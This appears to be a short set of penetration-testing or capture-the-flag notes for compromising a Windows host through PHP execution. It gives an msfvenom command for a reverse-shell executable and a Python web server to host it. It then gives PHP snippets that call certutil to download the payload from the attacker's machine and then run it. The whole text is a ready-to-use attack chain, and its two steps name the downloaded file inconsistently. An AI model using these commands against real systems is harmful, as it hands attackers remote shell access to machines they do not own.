# Create a payload with msfvenom
# msfvenom -p windows/x64/shell_reverse_tcp LHOST={own-ip} LPORT={listening-port} -f exe -o reverse.exe

# Following steps are two seperated files!
# Before executing them, start python server in the dir of the files
# python -m http.server 8000

# Step1: This snippet uploads the revshell to the target server
<?php 
$exec = system('certutil.exe -urlcache -split -f "http://{own-ip}:8000/reverse.exe" shell.exe', $val); 
?>

# Step2: Execute uploaded reverse shell
<?php 
$exec = system('reverse.exe', $val); 
?> 
